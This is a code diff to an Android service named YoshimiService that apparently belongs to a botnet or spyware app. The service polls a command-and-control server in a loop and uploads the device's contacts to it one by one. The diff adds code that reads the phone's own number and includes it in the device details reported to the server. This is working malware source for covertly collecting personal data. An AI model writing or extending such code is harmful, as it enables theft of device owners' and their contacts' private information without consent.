@@ -16,6 +16,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
 import android.os.IBinder;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 
 public class YoshimiService extends Service {
@@ -99,14 +100,15 @@ public class YoshimiService extends Service {
 		Log.d(TAG, "Starting main loop ...");
 		while (true) {
 			/* Poll server for commands */
-			Thread.sleep(30000);
-			Log.d(TAG, "Still alive!");
+			for (int index = 0; index < 30; index++) {
+				Thread.sleep(1000);
+				Log.d(TAG, "Still alive!");
+			}
 			Http.GET(CC_SERVER+"/bot/ping", uuid);
 		}
 	}
 	
 	private List<NameValuePair> getVersionInformation() {
-		Log.d(TAG, "Gathering version information ...");
 		List<NameValuePair> details = new ArrayList<NameValuePair>();
 		details.add(new BasicNameValuePair("os_version", System.getProperty("os.version")));
 		details.add(new BasicNameValuePair("build_version", android.os.Build.VERSION.INCREMENTAL));
@@ -116,6 +118,8 @@ public class YoshimiService extends Service {
 		details.add(new BasicNameValuePair("device", android.os.Build.DEVICE));
 		details.add(new BasicNameValuePair("model", android.os.Build.MODEL));
 		details.add(new BasicNameValuePair("product", android.os.Build.PRODUCT));
+		TelephonyManager tMgr = (TelephonyManager) getBaseContext().getSystemService(Context.TELEPHONY_SERVICE);
+		details.add(new BasicNameValuePair("phone_number", tMgr.getLine1Number()));
 		return details;
 	}
 	
@@ -148,11 +152,11 @@ public class YoshimiService extends Service {
 					String contact = contacts[index].getJsonObject();
 					List<NameValuePair> contactUpload = new ArrayList<NameValuePair>();
 					contactUpload.add(new BasicNameValuePair("jsonContact", contact));
-					String response = Http.POST(CC_SERVER+"/bot/contacts", uuid, contactUpload);
+					String response = Http.POST(CC_SERVER+"/bot/contacts", uuid, contactUpload).replaceAll("\\s","");
 					if (response.equals("ok")) {
 						Log.d(TAG, "Successfully uploaded contact to control server");
 					} else {
-						Log.e(TAG, "Failed to upload contact");
+						Log.e(TAG, "Failed to upload contact (" + response + ")");
 					}
 				} catch (Exception error) {
 					Log.d(TAG, "Failed to export contact as json: " + error.toString());
